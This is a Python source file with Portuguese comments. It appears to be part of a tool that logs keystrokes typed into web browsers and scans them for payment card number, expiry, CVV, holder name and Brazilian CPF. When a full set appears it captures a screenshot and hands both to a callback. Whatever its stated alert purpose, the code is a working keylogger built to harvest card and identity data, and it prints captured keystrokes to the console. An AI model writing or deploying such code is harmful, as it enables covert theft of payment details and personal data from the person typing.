# keyboard_monitor.py
"""
Monitor de teclado - VERSÃO CORRIGIDA (captura números)
"""

import threading
import time
from typing import Callable, Optional
from pynput import keyboard
from pattern_detector import PatternDetector, CardData
from screenshot_capture import ScreenshotCapture

try:
    import win32gui
    import win32process
    import psutil
    HAS_WIN32 = True
except ImportError:
    HAS_WIN32 = False


class KeyboardMonitor:
    """Monitora teclas digitadas"""
    
    BROWSERS = [
        'chrome', 'firefox', 'edge', 'msedge', 'opera', 'brave',
        'vivaldi', 'safari', 'iexplore', 'chromium', 'browser'
    ]
    
    def __init__(self, on_complete_detection: Callable[[CardData, any], None]):
        self.on_complete_detection = on_complete_detection
        self.detector = PatternDetector()
        self.screenshot = ScreenshotCapture()
        self.listener = None
        self.running = False
        
        self.current_status = {
            'card_number': False,
            'expiry_date': False,
            'cvv': False,
            'holder_name': False,
            'cpf': False
        }
        
        self.on_field_detected: Optional[Callable[[dict], None]] = None
        
        self.stats = {
            'keys_captured': 0,
            'detections': 0,
            'start_time': None
        }
    
    def get_active_window(self) -> tuple:
        """Retorna (título_janela, nome_processo)"""
        if not HAS_WIN32:
            return ("Navegador", "chrome")

        try:
            hwnd = win32gui.GetForegroundWindow()
            title = win32gui.GetWindowText(hwnd)
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            process = psutil.Process(pid)
            process_name = process.name().lower()
            return (title, process_name)
        except Exception as e:
            return ("Desconhecido", "unknown")
    
    def is_browser(self, process_name: str) -> bool:
        """Verifica se é navegador"""
        return any(browser in process_name.lower() for browser in self.BROWSERS)
    
    def on_key_press(self, key):
        """Callback para tecla pressionada - CORRIGIDO PARA NÚMEROS"""
        try:
            char = None
            
            # MÉTODO 1: Tecla com caractere direto (letras, símbolos)
            if hasattr(key, 'char') and key.char is not None:
                char = key.char
            
            # MÉTODO 2: Teclas especiais
            elif key == keyboard.Key.space:
                char = ' '
            elif key == keyboard.Key.backspace:
                char = '\b'
            elif key == keyboard.Key.enter:
                char = '\n'
            elif key == keyboard.Key.tab:
                char = '\t'
            
            # MÉTODO 3: Virtual Key (vk) - CAPTURA NÚMEROS!
            elif hasattr(key, 'vk') and key.vk is not None:
                vk = key.vk
                
                # Números do teclado principal (teclas 0-9)
                if 48 <= vk <= 57:
                    char = chr(vk)
                
                # Números do Numpad (teclado numérico)
                elif 96 <= vk <= 105:
                    char = str(vk - 96)
                
                # Barra do numpad
                elif vk == 111:
                    char = '/'
                
                # Ponto do numpad
                elif vk == 110:
                    char = '.'
            
            # Se não conseguiu identificar, ignora
            if char is None:
                return

            # Verifica janela ativa
            window_title, process_name = self.get_active_window()

            # DEBUG: mostra tecla capturada
            if char == '\b':
                display_char = '⌫'
            elif char == '\n':
                display_char = '↵'
            elif char == '\t':
                display_char = '⇥'
            elif char == ' ':
                display_char = '␣'
            else:
                display_char = char
            
            print(f"   🔤 Tecla: [{display_char}] | Processo: {process_name}")

            # Só processa se for navegador
            if not self.is_browser(process_name):
                print(f"   ⚠️ Ignorado (não é navegador)")
                return

            # Adiciona ao buffer do detector
            self.detector.add_character(char)
            self.stats['keys_captured'] += 1
            
            # DEBUG: Mostra buffer a cada 5 teclas
            if self.stats['keys_captured'] % 5 == 0:
                buffer = self.detector.buffer
                print(f"\n   📝 Buffer ({len(buffer)} chars): '{buffer[-60:]}'\n")

            # Analisa padrões a cada 3 teclas
            if self.stats['keys_captured'] % 3 == 0:
                self._check_for_complete_data(window_title)

        except Exception as e:
            print(f"   ❌ Erro: {e}")
            import traceback
            traceback.print_exc()
    
    def _check_for_complete_data(self, window_title: str):
        """Verifica se dados completos foram detectados"""
        result = self.detector.analyze()

        # Atualiza status dos campos
        if self.detector.card_data:
            new_status = {
                'card_number': self.detector.card_data.card_number is not None,
                'expiry_date': self.detector.card_data.expiry_date is not None,
                'cvv': self.detector.card_data.cvv is not None,
                'holder_name': self.detector.card_data.holder_name is not None,
                'cpf': self.detector.card_data.cpf is not None
            }

            # Se mudou algum status, mostra
            if new_status != self.current_status:
                self.current_status = new_status.copy()
                debug_status = self.detector.get_debug_status()
                print(f"\n   📊 Status: {debug_status}\n")

                if self.on_field_detected:
                    self.on_field_detected(new_status)

        # Se dados completos, dispara alerta
        if result and result.is_complete:
            if self.detector.should_alert():
                self.stats['detections'] += 1
                result.window_title = window_title

                print(f"\n" + "=" * 50)
                print(f"   🚨 DADOS COMPLETOS DETECTADOS!")
                print(f"=" * 50)
                print(f"   📸 Capturando screenshot...")
                
                screenshot_img = self.screenshot.capture_with_highlight()
                self.detector.mark_alerted()

                if self.on_complete_detection:
                    self.on_complete_detection(result, screenshot_img)
    
    def start(self):
        """Inicia monitoramento"""
        if self.running:
            return

        self.running = True
        self.stats['start_time'] = time.time()

        print("\n" + "=" * 60)
        print("🚀 MONITOR DE TECLADO INICIADO")
        print("=" * 60)
        print(f"   Win32 disponível: {HAS_WIN32}")
        print(f"   Navegadores monitorados: {len(self.BROWSERS)}")
        print("=" * 60)
        print("\n👆 Digite no navegador para testar!\n")

        try:
            self.listener = keyboard.Listener(on_press=self.on_key_press)
            self.listener.start()
            print("✅ Listener de teclado ativo\n")
        except Exception as e:
            print(f"❌ ERRO: {e}")
            raise
    
    def stop(self):
        """Para monitoramento"""
        self.running = False
        if self.listener:
            self.listener.stop()
            self.listener = None
        self.screenshot.cleanup()
        print("\n🛑 Monitor parado")
    
    def reset(self):
        """Reseta buffer e detecções"""
        self.detector.clear_buffer()
        self.current_status = {k: False for k in self.current_status}
        if self.on_field_detected:
            self.on_field_detected(self.current_status)
    
    def get_completion_status(self) -> dict:
        """Retorna status atual"""
        return {
            'fields': self.current_status,
            'percentage': self.detector.card_data.completeness_percentage if self.detector.card_data else 0,
            'is_complete': all([
                self.current_status.get('card_number'),
                self.current_status.get('expiry_date'),
                self.current_status.get('cvv')
            ])
        }